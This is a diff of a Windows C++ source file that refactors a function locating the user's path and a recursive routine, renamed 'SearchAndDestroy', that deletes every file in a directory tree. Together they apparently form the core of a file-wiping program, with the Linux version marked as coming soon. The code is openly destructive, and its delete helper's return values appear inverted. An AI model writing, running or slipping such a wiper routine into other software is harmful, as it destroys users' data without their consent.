@@ -3,10 +3,7 @@
 #ifdef __linux__
 	/*++++++++++++++Comming Soon++++++++++++++*/
 	/* Code for Libs for Linux Platform */
-
 #elif _WIN32
-	/*++++++++++++++Comming Soon++++++++++++++*/
-	
 	/*This Function finds the User path*/
 	std::wstring Path()
 	{
@@ -46,28 +43,22 @@
 
 	int Delete(std::wstring s)
 	{
-				if (_wremove(s.c_str()))
-				{
-					return 0;
-				}
+		if (_wremove(s.c_str())) return 0;
 		return -1;
 	}
 
-	void cd(std::wstring s) 
+	void SearchAndDestroy(std::wstring dir)
 	{
-		std::vector<std::wstring> v{};
-		int e{};
-		v = ListDir(s);
-		for (int i = 0; i < v.size(); i++)
+		std::vector<std::wstring> filenames;
+		filenames = ListDir(dir);
+		for (auto filename : filenames)
 		{
-			e = Delete(v[i]);
+			Delete(filename);
 		}
-		for each(std::wstring i in v)
+		for (auto filename : filenames)
 		{
-			std::wcout << i << std::endl;
-			cd(i);
+			SearchAndDestroy(filename);
 		}
 	}
-
 	
 #endif
